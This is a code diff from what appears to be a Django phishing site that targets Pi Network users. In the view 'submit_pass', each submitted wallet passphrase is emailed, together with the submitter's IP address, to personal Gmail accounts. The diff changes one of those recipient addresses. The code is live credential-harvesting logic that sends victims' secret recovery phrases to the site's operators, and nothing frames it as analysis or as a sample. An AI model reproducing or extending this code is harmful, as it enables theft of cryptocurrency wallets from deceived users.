@@ -144,7 +144,7 @@ def submit_pass(request):
                     else:
                         send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="ezekielobiajulu01@gmail.com")
                     
-                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="Ellangelo0@gmail.com")
+                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="geloellan0@gmail.com")
 
                 if my_site:
                     request.session['look_up'] = look_up_key
